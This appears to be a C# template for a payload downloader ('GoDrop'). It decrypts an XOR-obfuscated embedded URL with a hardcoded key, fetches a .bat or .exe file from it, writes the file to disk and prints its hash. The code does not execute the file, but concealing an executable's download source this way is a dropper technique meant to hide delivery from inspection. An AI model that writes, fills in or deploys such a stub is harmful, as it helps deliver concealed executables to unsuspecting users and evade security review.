using System.Security.Cryptography;
using System.Text;

const string EncryptionKey = "GoDropEmbedKey2026";
const string EncryptedUrlHex = "__ENC_URL__";

var options = ParseArgs(args);
var locale = PickLocale(options.Locale);

if (options.FileType is not ("bat" or "exe"))
{
    Console.WriteLine(locale.Unsupported);
    return;
}

var url = DecryptEmbeddedUrl();
if (!url.StartsWith("http://") && !url.StartsWith("https://"))
{
    Console.WriteLine(locale.InvalidUrl);
    return;
}

Console.WriteLine(locale.Downloading);
using var client = new HttpClient();
var payload = await client.GetByteArrayAsync(url);
await File.WriteAllBytesAsync(options.Out, payload);

var hash = Convert.ToHexString(SHA256.HashData(payload)).ToLowerInvariant();
Console.WriteLine($"{locale.Saved}: {options.Out}");
Console.WriteLine($"SHA256: {hash}");

string DecryptEmbeddedUrl()
{
    var cipher = Convert.FromHexString(EncryptedUrlHex);
    var keyBytes = Encoding.UTF8.GetBytes(EncryptionKey);

    for (var i = 0; i < cipher.Length; i++)
    {
        cipher[i] ^= keyBytes[i % keyBytes.Length];
    }

    return Encoding.UTF8.GetString(cipher);
}

static Options ParseArgs(string[] args)
{
    var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
    for (int i = 0; i < args.Length - 1; i += 2)
    {
        dict[args[i].TrimStart('-')] = args[i + 1];
    }

    return new Options(
        dict.GetValueOrDefault("out", "godrop-output.bat"),
        dict.GetValueOrDefault("type", "bat").ToLowerInvariant(),
        dict.GetValueOrDefault("locale", "en").ToLowerInvariant()
    );
}

static Locale PickLocale(string code) => code switch
{
    "es" => new("Descargando artefacto...", "Guardado", "Solo se admiten archivos .exe y .bat.", "La URL integrada debe usar http o https."),
    "fr" => new("Téléchargement de l'artefact...", "Enregistré", "Seuls les fichiers .exe et .bat sont pris en charge.", "L'URL intégrée doit utiliser http ou https."),
    _ => new("Downloading artifact...", "Saved", "Only .exe and .bat files are supported.", "Embedded URL must use http or https.")
};

record Options(string Out, string FileType, string Locale);
record Locale(string Downloading, string Saved, string Unsupported, string InvalidUrl);
